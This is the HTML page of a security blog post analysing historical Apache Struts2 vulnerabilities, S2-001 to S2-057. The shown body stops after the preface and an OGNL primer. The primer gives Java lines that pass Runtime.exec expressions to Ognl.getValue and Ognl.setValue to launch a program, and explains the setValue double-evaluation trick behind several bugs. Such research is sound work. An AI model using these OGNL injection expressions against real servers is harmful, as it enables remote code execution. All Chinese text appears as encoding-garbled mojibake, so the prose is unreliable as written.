<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>ã€notesã€‘struts2å†å²æ¼æ´åˆ†æ | 0kami&#39;s Blog</title>
  <meta name="description" content="A Web ğŸ¶ &amp;&amp; Code Reviewer">
  <meta name="keywords" content>
  <meta name="HandheldFriendly" content="True">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <link rel="shortcut icon" href="/images/avatar.jpg">
  <link rel="alternate" href="/atom.xml" title="0kami's Blog">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="0x00 å‰è¨€ 17å¹´çš„æ—¶å€™æ•´ç†è¿‡struts2ç›¸å…³çš„POCï¼Œæ—¶éš”3å¹´ï¼Œè™½ç„¶struts2å·²ç»ä¸å†é‚£ä¹ˆæµè¡Œäº†ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤§çš„ç ”ç©¶ä»·å€¼ï¼Œæœ¬æ–‡å°†ä¸€ç‚¹ä¸€ç‚¹è·Ÿä¸€ä¸‹struts2 æœ‰ä»·å€¼çš„æ¼æ´XD">
<meta name="keywords" content="vul">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€notesã€‘struts2å†å²æ¼æ´åˆ†æ">
<meta property="og:url" content="http://blog.0kami.cn/2020/05/22/talk-about-struts2/index.html">
<meta property="og:site_name" content="0kami&#39;s Blog">
<meta property="og:description" content="0x00 å‰è¨€ 17å¹´çš„æ—¶å€™æ•´ç†è¿‡struts2ç›¸å…³çš„POCï¼Œæ—¶éš”3å¹´ï¼Œè™½ç„¶struts2å·²ç»ä¸å†é‚£ä¹ˆæµè¡Œäº†ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤§çš„ç ”ç©¶ä»·å€¼ï¼Œæœ¬æ–‡å°†ä¸€ç‚¹ä¸€ç‚¹è·Ÿä¸€ä¸‹struts2 æœ‰ä»·å€¼çš„æ¼æ´XD">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200506154002054.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428211153680.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428212308880.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428213206168.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428220429903.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428220447992.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428221026617.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428223750035.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200428231900257.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200430155156109.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200430155231489.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200430155418664.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200430232206989.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200430232635455.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200430234629782.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507101610804.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507102155210.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507102334789.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507103428140.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507103621957.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507103632321.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507103642250.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200507110201209.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509111903026.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509111939166.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509112218065.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509114347567.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509120444634.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509202547849.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509202741614.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200509204915751.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200511171450014.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200511171056619.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200511204523185.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200511222139049.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200511223638532.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519154216690.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513145252050.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513145417046.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513145546225.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513150115678.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513150240332.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513151342610.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513151651915.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513151842698.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200513155116772.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514151446611.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514150911888.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514151844894.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514152500049.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514152517255.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514165546294.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514202040764.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514202919865.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514173311368.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200514173631503.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200515154730941.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200515154855569.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519143433067.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519144431546.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519144525695.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519144603429.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519152941105.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519153530702.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519153555655.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200519165840354.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200520223124404.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200520223603177.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200520223738228.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200520230704180.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200520233839824.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200520233957407.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200520234647887.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521112254951.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521154143972.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521154319856.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521154524558.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521155036903.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521155309089.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521155346720.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521155451100.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521155901705.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521155825583.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521172344561.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200521204140738.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522100814912.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522101114659.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522101244620.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522102217477.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522102927472.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522103937515.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522111039529.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522111238176.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522111315111.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522152919691.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522153229727.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522153556365.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522154209594.png">
<meta property="og:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200522154315511.png">
<meta property="og:updated_time" content="2020-05-22T13:30:24.764Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ã€notesã€‘struts2å†å²æ¼æ´åˆ†æ">
<meta name="twitter:description" content="0x00 å‰è¨€ 17å¹´çš„æ—¶å€™æ•´ç†è¿‡struts2ç›¸å…³çš„POCï¼Œæ—¶éš”3å¹´ï¼Œè™½ç„¶struts2å·²ç»ä¸å†é‚£ä¹ˆæµè¡Œäº†ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤§çš„ç ”ç©¶ä»·å€¼ï¼Œæœ¬æ–‡å°†ä¸€ç‚¹ä¸€ç‚¹è·Ÿä¸€ä¸‹struts2 æœ‰ä»·å€¼çš„æ¼æ´XD">
<meta name="twitter:image" content="http://blog.0kami.cn/assets/talk_about_struts2/image-20200506154002054.png">

  <link href="https://fonts.googleapis.com/css?family=Inconsolata|Titillium+Web" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
  <link href="//cdn.bootcss.com/node-waves/0.7.5/waves.min.css" rel="stylesheet">
  <link rel="stylesheet" href="/style.css">
  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>
</head>
</html>
<body>
  <div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>


  <script>setLoadingBarProgress(20)</script> 
  <header class="l_header">
	<div class='wrapper'>
		<div class="nav-main container container--flex">
			<a class="logo flat-box" href='/' >
				0kami's Blog
			</a>
			<div class='menu'>
				<ul class='h-list'>
					
						<li>
							<a class='flat-box nav-home' href='/'>
								Home
							</a>
						</li>
					
						<li>
							<a class='flat-box nav-archives' href='/archives'>
								Archives
							</a>
						</li>
					
						<li>
							<a class='flat-box nav-about' href='/about'>
								About
							</a>
						</li>
					
				</ul>
				<div class='underline'></div>
			</div>
			
				<div class="m_search">
					<form name="searchform" class="form u-search-form">
						<input type="text" class="input u-search-input" placeholder="Search" />
						<span class="icon icon-search"></span>
					</form>
				</div>
			
			<ul class='switcher h-list'>
				
					<li class='s-search'><a href='javascript:void(0)'><span class="icon icon-search flat-box"></span></a></li>
				
				<li class='s-menu'><a href='javascript:void(0)'><span class="icon icon-menu flat-box"></span></a></li>
			</ul>
		</div>
		
		<div class='nav-sub container container--flex'>
			<a class="logo" class="flat-box" href='javascript:void(0)'>
				Word of Forks
			</a>

			<ul class='switcher h-list'>
				<li class='s-comment'><a href='javascript:void(0)'><span class="icon icon-chat_bubble_outline flat-box"></span></a></li>
				<li class='s-top'><a href='javascript:void(0)'><span class="icon icon-arrow_upward flat-box"></span></a></li>
				<li class='s-toc'><a href='javascript:void(0)'><span class="icon icon-format_list_numbered flat-box"></span></a></li>
			</ul>
		</div>
	</div>
</header>
<aside class="menu-phone">
	<nav>
		
			<a href="/" class="nav-home nav">
				Home
			</a>
		
			<a href="/archives" class="nav-archives nav">
				Archives
			</a>
		
			<a href="/about" class="nav-about nav">
				About
			</a>
		
	</nav>
</aside>

    <script>setLoadingBarProgress(40);</script>
  <div class="l_body">
    <div class='container clearfix'>
      <div class='l_main'>
        <article id="post-talk-about-struts2"
  class="post white-box article-type-post"
  itemscope itemprop="blogPost">
	<section class='meta'>
	<h2 class="title">
  	<a href="/2020/05/22/talk-about-struts2/">
    	ã€notesã€‘struts2å†å²æ¼æ´åˆ†æ
    </a>
  </h2>
	<time>
	  May 22, 2020
	</time>
	
    
    <div class='cats'>
        <a href="/categories/notes/">notes</a>
    </div>

	</section>
	
		<section class="toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-å‰è¨€"><span class="toc-number">1.</span> <span class="toc-text">0x00 å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-åŸºç¡€"><span class="toc-number">2.</span> <span class="toc-text">0x01 åŸºç¡€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-å†å²ç‰ˆæœ¬å›é¡¾"><span class="toc-number">3.</span> <span class="toc-text">0x02 å†å²ç‰ˆæœ¬å›é¡¾</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-S2-001"><span class="toc-number">3.1.</span> <span class="toc-text">1. S2-001</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#æ¼æ´åˆ†æ"><span class="toc-number">3.1.1.</span> <span class="toc-text">æ¼æ´åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å›æ˜¾POC"><span class="toc-number">3.1.2.</span> <span class="toc-text">å›æ˜¾POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®å¤"><span class="toc-number">3.1.3.</span> <span class="toc-text">ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-S2-003"><span class="toc-number">3.2.</span> <span class="toc-text">2. S2-003</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#æ¼æ´åˆ†æ-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">æ¼æ´åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POCåˆ†æ"><span class="toc-number">3.2.2.</span> <span class="toc-text">POCåˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®å¤-1"><span class="toc-number">3.2.3.</span> <span class="toc-text">ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-S2-005"><span class="toc-number">3.3.</span> <span class="toc-text">3. S2-005</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POCåˆ†æ-1"><span class="toc-number">3.3.1.</span> <span class="toc-text">POCåˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®å¤-2"><span class="toc-number">3.3.2.</span> <span class="toc-text">ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-S2-007"><span class="toc-number">3.4.</span> <span class="toc-text">4. S2-007</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">3.4.1.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-S2-008"><span class="toc-number">3.5.</span> <span class="toc-text">5. S2-008</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CookieInterceptor"><span class="toc-number">3.5.1.</span> <span class="toc-text">CookieInterceptor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DebuggingInterceptor"><span class="toc-number">3.5.2.</span> <span class="toc-text">DebuggingInterceptor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-1"><span class="toc-number">3.5.3.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-S2-009"><span class="toc-number">3.6.</span> <span class="toc-text">6. S2-009</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-2"><span class="toc-number">3.6.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®å¤-3"><span class="toc-number">3.6.2.</span> <span class="toc-text">ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-S2-012"><span class="toc-number">3.7.</span> <span class="toc-text">7. S2-012</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®å¤-4"><span class="toc-number">3.7.1.</span> <span class="toc-text">ä¿®å¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-3"><span class="toc-number">3.7.2.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-S2-013-S2-014"><span class="toc-number">3.8.</span> <span class="toc-text">8. S2-013/S2-014</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-4"><span class="toc-number">3.8.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®å¤-5"><span class="toc-number">3.8.2.</span> <span class="toc-text">ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-S2-015"><span class="toc-number">3.9.</span> <span class="toc-text">9. S2-015</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-5"><span class="toc-number">3.9.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®å¤-6"><span class="toc-number">3.9.2.</span> <span class="toc-text">ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-S2-016"><span class="toc-number">3.10.</span> <span class="toc-text">10. S2-016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-6"><span class="toc-number">3.10.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®å¤-7"><span class="toc-number">3.10.2.</span> <span class="toc-text">ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-S2-019"><span class="toc-number">3.11.</span> <span class="toc-text">11. S2-019</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-7"><span class="toc-number">3.11.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®å¤-8"><span class="toc-number">3.11.2.</span> <span class="toc-text">ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-S2-029-S2-036"><span class="toc-number">3.12.</span> <span class="toc-text">12. S2-029/S2-036</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-8"><span class="toc-number">3.12.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®å¤S2-029"><span class="toc-number">3.12.2.</span> <span class="toc-text">ä¿®å¤S2-029</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®å¤S2-036"><span class="toc-number">3.12.3.</span> <span class="toc-text">ä¿®å¤S2-036</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-S2-032-S2-033-S2-037"><span class="toc-number">3.13.</span> <span class="toc-text">13. S2-032/S2-033/S2-037</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-9"><span class="toc-number">3.13.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-032-S2-033ä¿®å¤"><span class="toc-number">3.13.2.</span> <span class="toc-text">S2-032/S2-033ä¿®å¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-037ä¿®å¤"><span class="toc-number">3.13.3.</span> <span class="toc-text">S2-037ä¿®å¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¸€ä¸ªæœ‰æ„æ€çš„åœ°æ–¹"><span class="toc-number">3.13.4.</span> <span class="toc-text">ä¸€ä¸ªæœ‰æ„æ€çš„åœ°æ–¹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-S2-045-S2-046"><span class="toc-number">3.14.</span> <span class="toc-text">14. S2-045/S2-046</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-10"><span class="toc-number">3.14.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®å¤-9"><span class="toc-number">3.14.2.</span> <span class="toc-text">ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-S2-048"><span class="toc-number">3.15.</span> <span class="toc-text">15. S2-048</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-S2-052"><span class="toc-number">3.16.</span> <span class="toc-text">16. S2-052</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-11"><span class="toc-number">3.16.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®å¤-10"><span class="toc-number">3.16.2.</span> <span class="toc-text">ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-S2-053"><span class="toc-number">3.17.</span> <span class="toc-text">17. S2-053</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-12"><span class="toc-number">3.17.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®å¤-11"><span class="toc-number">3.17.2.</span> <span class="toc-text">ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-S2-055"><span class="toc-number">3.18.</span> <span class="toc-text">18. S2-055</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-S2-057"><span class="toc-number">3.19.</span> <span class="toc-text">19. S2-057</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-13"><span class="toc-number">3.19.1.</span> <span class="toc-text">POC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-æ€»ç»“"><span class="toc-number">4.</span> <span class="toc-text">0x03 æ€»ç»“</span></a></li></ol></section>
	
	<section class="article typo">
  	<div class="article-entry" itemprop="articleBody">
    	<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><hr>
<p>17å¹´çš„æ—¶å€™æ•´ç†è¿‡struts2ç›¸å…³çš„POCï¼Œæ—¶éš”3å¹´ï¼Œè™½ç„¶struts2å·²ç»ä¸å†é‚£ä¹ˆæµè¡Œäº†ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤§çš„ç ”ç©¶ä»·å€¼ï¼Œæœ¬æ–‡å°†ä¸€ç‚¹ä¸€ç‚¹è·Ÿä¸€ä¸‹struts2 æœ‰ä»·å€¼çš„æ¼æ´XD</p>
<a id="more"></a>
<h1 id="0x01-åŸºç¡€"><a href="#0x01-åŸºç¡€" class="headerlink" title="0x01 åŸºç¡€"></a>0x01 åŸºç¡€</h1><hr>
<p>struts2 æºç ä¸‹è½½<a href="https://archive.apache.org/dist/struts/source/" target="_blank" rel="noopener">https://archive.apache.org/dist/struts/source/</a></p>
<p>struts2å·¥ä½œæµç¨‹ <a href="https://blog.csdn.net/snow_7/article/details/51513381" target="_blank" rel="noopener">https://blog.csdn.net/snow_7/article/details/51513381</a></p>
<p>ognlè¡¨è¾¾å¼<a href="https://www.cnblogs.com/renchunxiao/p/3423299.html" target="_blank" rel="noopener">https://www.cnblogs.com/renchunxiao/p/3423299.html</a></p>
<p>struts2 æŠ€æœ¯å†…å¹• ç¬¬6ç«  OGNL</p>
<p>struts2æ¼æ´çš„äº§ç”Ÿé€šOGNLè¡¨è¾¾å¼çš„æ‰§è¡Œæœ‰å¾ˆå¤§çš„å…³è”ï¼Œå†å²ä¸Šå¾ˆå¤šç‰ˆæœ¬çš„æ¼æ´ï¼Œéƒ½æ˜¯å› ä¸ºä¸å®‰å…¨çš„ç”¨æˆ·è¾“å…¥æµè½¬åˆ°äº†<code>Ognl.getValue</code>ã€<code>Ognl.setValue</code>è€Œå¯¼è‡´çš„OGNLè¡¨è¾¾å¼çš„è®¡ç®—ã€‚åæ–‡ä¸å¯¹Ognlåç»­çš„å†…å®¹åšåˆ†æ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è°ƒç”¨é™æ€å‡½æ•° æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">Ognl.getValue(<span class="string">"@java.lang.Runtime@getRuntime().exec('open /Applications/Calculator.app/')"</span>, context);</span><br><span class="line">Ognl.setValue(<span class="string">"(\"@java.lang.Runtime@getRuntime().exec(\'open /System/Applications/Calculator.app/\')\")(bla)(bla)"</span>,context,<span class="string">""</span>);</span><br></pre></td></tr></table></figure>
<p>æ›´å¤šç”¨æ³•çœ‹<a href="http://commons.apache.org/proper/commons-ognl/language-guide.html" target="_blank" rel="noopener">http://commons.apache.org/proper/commons-ognl/language-guide.html</a></p>
<p>å…¶ä¸­å…³äº<code>setValue</code>çš„åˆ©ç”¨ç”¨çš„æ˜¯Expression Evaluationéƒ¨åˆ†ï¼Œ<code>(1)(2)(3)</code>ä¸­<code>(1)(2)</code>è¢«ä½œä¸ºä¸€ä¸ªæ•´ä½“è§£æï¼Œå¯¹äº<code>(1)</code>åšè¡¨è¾¾å¼çš„è§£æï¼Œå¦‚æœä½ ç”¨<code>getValue((1)(2))</code>ä¼šå‘ç°å…¶å®ä¹Ÿèƒ½æ‰§è¡Œå‘½ä»¤ï¼Œè€Œ<code>setValue((1)(2)(3))</code>éœ€è¦double evaluationï¼Œå®é™…ä¸Šå˜æˆ<code>((1)(2))(3)</code>ï¼Œåœ¨åç»­è°ƒç”¨<code>setValueBody</code>å‡½æ•°æ—¶å–å‡ºçš„<code>children[0]</code>å°±æ˜¯<code>(1)(2)</code>ï¼Œç­‰åŒäºè°ƒç”¨<code>Ognl.getValue((1)(2))</code>çš„æ•ˆæœã€‚æ‰€ä»¥è¿™é‡Œè°ƒç”¨<code>setValue</code>ä¹ŸåŒæ ·å¯ä»¥è¾¾æˆ<code>getValue</code>çš„è®¡ç®—OGNLè¡¨è¾¾å¼çš„æ•ˆæœã€‚</p>
<p><img src="/assets/talk_about_struts2/image-20200506154002054.png" alt="image-20200506154002054"></p>
<p>åŒæ ·ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨<code>children[1]</code>çš„ä½ç½®ï¼Œå¦‚<code>(1)((2)(3))</code>æŠŠpayloadæ”¾åˆ°<code>(2)(3)</code></p>
<p>å…³äº<code>setValue</code>å‡½æ•°çš„å¦ä¸€ç§åˆ©ç”¨æ–¹æ³•S2-009çš„æ–¹å¼<code>a[(1)(2)]</code>ï¼Œå…¶ä¸­<code>(1)(2)</code>åç»­ä¼šå•ç‹¬æ‹¿å‡ºæ¥è¢«å½“ä½œOGNLè¡¨è¾¾å¼æ‰§è¡Œã€‚</p>
